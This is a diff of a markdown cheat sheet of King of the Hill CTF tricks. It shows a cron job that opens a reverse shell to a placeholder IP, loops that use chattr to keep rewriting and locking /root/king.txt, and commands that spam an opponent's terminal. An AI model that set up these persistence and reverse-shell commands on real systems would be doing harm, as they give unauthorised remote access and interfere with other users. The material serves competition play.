@@ -1,5 +1,5 @@
 # KOTH-Tricks
-## Make King.txt unwritable
+## Make king.txt unwritable
 ### Using noclobber
 ```
 set -o noclobber /root/king.txt
@@ -31,8 +31,8 @@ mkdir .hidden_folder
 -----------------------------------------------------------------------------
 -----------------------------------------------------------------------------
 ## Use Cronjobs for automation
-### Reverse shell
 > Run 'crontab -e' and paste these line
+### Reverse shell
 ```
 * * * * * /bin/sh -i >& /dev/tcp/YOUR_IP/LISTENING_PORT 0>&1
 ```
@@ -60,7 +60,7 @@ script -f /dev/pts/#
 ```
 ### Spam your username to opponent shell
 ```
-while true; do echo 'Your_Username' >/dev/pts/#; done 
+while true; do echo 'YOUR_USERNAME' >/dev/pts/#; done 
 ```
 ### Using nyancat
 Downloading nyancat to local Machine
@@ -80,7 +80,7 @@ chmod +x nyancat
 -----------------------------------------------------------------------------
 ## while loop Tricks
 ```
-while [[ $(cat /root/king.txt) != "USERNAME" ]]; do echo "USERNAME" > /root/king.txt; done
-while true do; chattr -ia /root/king.txt 2>/dev/null; echo "USERNAME" >/root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; done
+while [[ $(cat /root/king.txt) != "YOUR_USERNAME" ]]; do echo "YOUR_USERNAME" > /root/king.txt; done
+while true; do chattr -ia /root/king.txt 2>/dev/null; echo "YOUR_USERNAME" >/root/king.txt 2>/dev/null; chattr +ia /root/king.txt 2>/dev/null; done
 ```
 
